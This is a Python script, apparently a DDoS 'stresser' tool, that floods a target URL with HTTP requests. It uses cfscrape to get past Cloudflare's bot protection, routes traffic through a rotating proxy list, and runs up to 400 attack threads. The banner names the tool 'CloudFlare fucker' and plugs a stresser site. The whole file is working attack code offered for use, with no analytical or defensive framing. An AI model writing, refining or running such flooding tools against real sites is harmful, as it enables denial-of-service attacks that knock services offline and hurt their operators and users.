import cfscrape
import os
import random
import time
import sys
import requests
import threading
from colorama import Fore

print(Fore.GREEN + "CloudFlare fucker by xr4zz3rs - RealStresser.COM")

def Options():
    for a in range(thr):
        x = threading.Thread(target=Attack)
        x.start()
        print("Threads " + str(a+1) + " created!")
    print("Please wait...")
    time.sleep(10)
    global oo
    oo = True

oo = False

def main():
    global target
    global attackTime
    global proxyList
    global pprr
    global thr
    global per
    global ssl

    target = sys.argv[1]
    attackTime = sys.argv[2]
    ssl = False
    proxyList = sys.argv[3]
    pprr = open(proxyList).readlines()
    print(Fore.YELLOW + "Proxies Count: " + Fore.RED + "%d" %len(pprr))
    thr = int(sys.argv[4]) # THREADS 1-400!
    per = int(sys.argv[5]) # CC POWER 1-100!
    Options()

def Attack():
	pprr = open(proxyList).readlines()
	proxy = random.choice(pprr).strip().split(":")
	s = cfscrape.create_scraper()
	s.proxies = {}
	s.proxies['http'] = 'http://'+str(proxy[0])+":"+str(proxy[1])
	s.proxies['https'] = 'https://'+str(proxy[0])+":"+str(proxy[1])
	time.sleep(5)
	while True:
		while oo:
			try:
				s.get(target)
				print(Fore.CYAN + "Bypass -> " + Fore.WHITE + str(target)+ Fore.CYAN + " From~# " +Fore.WHITE+ str(proxy[0])+":"+str(proxy[1]))
				try:
					for g in range(per):
						s.get(target)
						print(Fore.CYAN + "Bypass -> " + Fore.WHITE + str(target)+Fore.CYAN + " From~# " +Fore.WHITE + str(proxy[0])+":"+str(proxy[1])) #code By GogoZin
					s.close()
				except:
					s.close()
			except:
				s.close()
				print(Fore.RED + "Can't Connect To Proxies Or Url !")

if __name__ == "__main__":
	main()